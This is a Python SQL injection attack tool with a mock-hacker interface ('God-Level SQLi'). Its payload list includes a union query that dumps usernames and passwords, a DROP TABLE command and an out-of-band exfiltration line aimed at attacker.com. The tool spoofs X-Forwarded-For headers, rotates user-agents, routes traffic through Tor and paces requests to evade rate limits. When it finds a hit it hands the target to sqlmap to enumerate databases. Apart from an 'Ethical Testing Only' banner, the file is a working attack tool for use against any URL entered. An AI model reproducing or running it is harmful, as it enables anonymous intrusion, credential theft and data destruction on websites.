import os
import sys
import time
import random
import subprocess
from threading import Thread
import requests
from bs4 import BeautifulSoup
import urllib.parse

# God-Level ASCII Animations
def god_spinner(duration=3):
    skull = ["💀   ", " 💀  ", "  💀 ", "   💀"]
    end_time = time.time() + duration
    while time.time() < end_time:
        for s in skull:
            sys.stdout.write(f'\rGod-Level SQLi Attack Loading... {s} 🔥')
            sys.stdout.flush()
            time.sleep(0.1)
    print('\n🚀 Ultra Attack Ready! 😈😈😈')

def progress_bar(current, total, prefix='Attack Progress', suffix='Complete', length=40):
    filled = int(length * current // total)
    bar = '█' * filled + '-' * (length - filled)
    print(f'\r{prefix}: |{bar}| {current}/{total} ({current/total*100:.1f}%) {suffix}', end='', flush=True)
    if current == total:
        print()

# Advanced Payloads (Bypass WAF, Blind, Time-Based)
sql_payloads = [
    "' OR '1'='1' --",  # Basic
    "%27%20OR%20%271%27=%271",  # Encoded WAF bypass
    "' UNION SELECT NULL, NULL, NULL--",  # Union-Based
    "' UNION SELECT username, password FROM users--",  # Data dump
    "' AND IF(1=1, SLEEP(5), 0)--",  # Time-Based Blind
    "' AND IF(1=2, SLEEP(5), 0)--",  # False check
    "' AND (SELECT LOAD_FILE(concat('\\\\',(SELECT database()),'.attacker.com\\x')))--",  # Out-of-Band
    "'; DROP TABLE users; --",  # Destructive
    "<script>' OR '1'='1</script>",  # XSS+SQLi mix
    "%27%3B%20SELECT%20SLEEP(5)--"  # Encoded time-based
]

# Random User-Agents for WAF Bypass
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

# Scrape CSRF Token
def get_csrf_token(url):
    try:
        response = requests.get(url, headers={'User-Agent': random.choice(user_agents)})
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'csrf_token'})
        return token['value'] if token else None
    except:
        return None

# SQLi Test with Bypass
def sqli_test(url, payload, method='GET', csrf_token=None):
    headers = {
        'User-Agent': random.choice(user_agents),
        'X-Forwarded-For': f"192.168.{random.randint(0,255)}.{random.randint(0,255)}",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'} if use_tor else {}
    try:
        if method == 'POST':
            data = {'input': payload}
            if csrf_token:
                data['csrf_token'] = csrf_token
            response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
        else:
            encoded_payload = urllib.parse.quote(payload)
            response = requests.get(url + encoded_payload, headers=headers, proxies=proxies, timeout=10)
        elapsed = response.elapsed.total_seconds()
        return response.status_code, len(response.text), elapsed, 'Vulnerable' if 'error' in response.text.lower() or elapsed > 4 or len(response.text) > 1000 else 'Safe'
    except Exception as e:
        return 0, 0, 0, str(e)

# God-Level Exploitation (Multi-Threaded)
def exploit_thread(url, payloads, thread_id):
    csrf_token = get_csrf_token(url)
    for i, payload in enumerate(payloads):
        status, length, elapsed, result = sqli_test(url, payload, method='POST' if csrf_token else 'GET', csrf_token=csrf_token)
        progress_bar(i+1, len(payloads), prefix=f'Thread {thread_id} 😈')
        print(f'\nThread {thread_id}: Payload "{payload[:50]}..." - Status: {status}, Time: {elapsed:.2f}s, Result: {result}')
        if 'Vulnerable' in result or elapsed > 4:
            print(f'🚨 VULNERABILITY FOUND in Thread {thread_id}! 😈😈😈')
            subprocess.run(['python', 'sqlmap/sqlmap.py', '-u', url, '--batch', '--dbs', '--tamper=space2comment'])
            break
        time.sleep(random.uniform(0.5, 1.5))  # Random delay for rate limit bypass

# Main
if __name__ == "__main__":
    print("🔥 Ultra God-Level Anonymous SQLi Tool (Ethical Testing Only) 🔥")
    god_spinner(3)  # God-Level Animation

    url = input("Enter target URL (e.g., https://your-site.com/search?q=): ")
    num_threads = int(input("Enter number of threads (5-20): "))
    global use_tor
    use_tor = input("Use Tor proxy for anonymity? (y/n): ").lower() == 'y'

    if use_tor:
        os.system('tor &')  # Start Tor
        time.sleep(5)  # Wait for Tor

    print("Starting ultra SQLi attack with bypass...")
    threads = []
    payloads_per_thread = len(sql_payloads) // num_threads

    for i in range(num_threads):
        start = i * payloads_per_thread
        end = start + payloads_per_thread if i < num_threads - 1 else len(sql_payloads)
        t = Thread(target=exploit_thread, args=(url, sql_payloads[start:end], i))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\n💀 Ultra Attack Complete! Check for vulnerabilities above. 😈😈😈")
